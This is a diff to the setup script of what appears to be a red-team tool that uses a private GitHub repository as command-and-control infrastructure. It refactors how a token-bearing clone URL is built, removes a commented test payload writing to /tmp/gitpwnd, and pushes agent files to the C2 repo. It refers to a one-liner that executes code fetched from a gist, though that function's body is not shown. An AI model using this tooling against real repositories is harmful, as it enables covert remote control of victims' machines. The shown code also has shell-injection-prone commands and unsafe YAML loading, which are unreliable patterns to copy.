@@ -169,6 +169,9 @@ copy somewhere safe if you want to re-run this script later.
 
 
     should_sync_c2_history = True # are we going to push the benign git history to the newly created c2 git repo?
+    
+    config["primary_clone_url"] = "https://%s@github.com/%s/%s.git" % (config["main_github_token"],
+       config["main_github_username"], config["github_c2_repo_name"])
 
     print("[*] Creating private GitHub repo: %s/%s" % (config["main_github_username"], config["github_c2_repo_name"]) )
     try:
@@ -224,9 +227,6 @@ def sync_c2_history(config):
 
     # cd into cloned git repo to do git munging there
     os.chdir(config["benign_repo_path"])
-
-    config["primary_clone_url"] = "https://%s@github.com/%s/%s.git" % (config["main_github_token"],
-      config["main_github_username"], config["github_c2_repo_name"])
 
     # Push history and tags
     subprocess.check_output("git push --all --repo " + config["primary_clone_url"], shell=True)
@@ -338,11 +338,6 @@ def get_bootstrap_content(config):
 
     return templatized_bootstrap_file.safe_substitute(params)
 
-#     return """
-# with open("/tmp/gitpwnd", "w") as f:
-#     f.write("owned")
-# """
-
 # After all the setup has been done, get the one liner that should be placed in a repo
 def get_python_one_liner(gist_url):
     # Note that `exec` is required for multiline statements, eval seems to only do simple expressions
@@ -393,15 +388,16 @@ def _add_file_to_c2_repo(config, template_file_path, params, dest_path_in_c2_rep
     with open(dest_file, "w") as f:
         f.write(templatized_file.safe_substitute(params))
 
-    # Add agent.py to the c2 repo #
+    # Add file to the c2 repo
     orig_dir = os.path.abspath(os.curdir)
     # cd into cloned git repo to do git munging there
     os.chdir(config["benign_repo_path"])
-
-    # Add agent.py and push
-    subprocess.check_output("git add %s" % dest_path_in_c2_repo, shell=True)
-    subprocess.check_output("git commit -m 'Add %s'" % dest_path_in_c2_repo, shell=True)
-    subprocess.check_output("git push --repo %s" % config["primary_clone_url"], shell=True)
+    
+    if "nothing to commit" not in str(subprocess.check_output("git status", shell=True)):
+        # Add agent.py and push
+        subprocess.check_output("git add %s" % dest_path_in_c2_repo, shell=True)
+        subprocess.check_output("git commit -m 'Add %s'" % dest_path_in_c2_repo, shell=True)
+        subprocess.check_output("git push --repo %s" % config["primary_clone_url"], shell=True)
 
     os.chdir(orig_dir)
 
@@ -475,8 +471,13 @@ def main(setup_dir, repo_dir, ssh_key_dir):
 
     # Usage: python3 setup.py <optional path to config.yml>
     if len(sys.argv) > 1:
-        with open(sys.argv[1], 'r') as f:
-            config = yaml.load(f)
+        config_path = sys.argv[1]
+    else:
+        print("[*] Using default config path of ./config.yml")  
+        config_path = "./config.yml"
+
+    with open(config_path, 'r') as f:
+        config = yaml.load(f)
 
 
 
